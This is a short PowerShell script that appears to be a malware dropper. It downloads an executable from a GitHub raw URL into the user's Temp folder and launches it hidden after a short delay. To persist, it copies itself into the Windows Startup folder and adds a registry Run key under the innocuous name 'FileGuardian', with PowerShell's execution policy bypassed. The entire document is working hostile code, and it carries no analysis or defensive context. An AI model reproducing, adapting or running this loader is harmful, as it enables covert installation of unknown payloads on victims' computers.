# 📌 Variables:
$FileURL       = "https://raw.githubusercontent.com/wetiee/oculushelp/main/ok.exe"
$TargetPath    = "$env:LOCALAPPDATA\Temp\katysaneur.exe"
$LaunchDelay   = 3
$WindowStyle   = "Hidden"

$StartupScriptPath   = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\FileGuardian.ps1"
$StartupRegPath  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# 📌 Function: Set persistence via Startup folder and Registry
function Set-Persistence {
    try {
        # Copy this script to Startup folder
        if (-not (Test-Path $StartupScriptPath)) {
            Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $StartupScriptPath -Force
        }

        # Add Registry Run key for persistence
        $command = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
        Set-ItemProperty -Path $StartupRegPath -Name "FileGuardian" -Value $command -Force

        Write-Host "[+] Persistence established."
    }
    catch {
        Write-Host "[!] Failed to set persistence: $_"
    }
}

# 📌 Function: Download & Run file (always run, download if missing)
function Run-Payload {
    try {
        if (-not (Test-Path $TargetPath)) {
            Write-Host "[*] File not found — downloading..."
            Invoke-WebRequest -Uri $FileURL -OutFile $TargetPath
        }

        Start-Sleep -Seconds $LaunchDelay

        # Execute downloaded file hidden
        Start-Process -FilePath $TargetPath -WindowStyle $WindowStyle

        Write-Host "[+] Executed: $TargetPath"
    }
    catch {
        Write-Host "[!] Failed to download or launch file: $_"
    }
}

# 📌 Main execution:
Set-Persistence
Run-Payload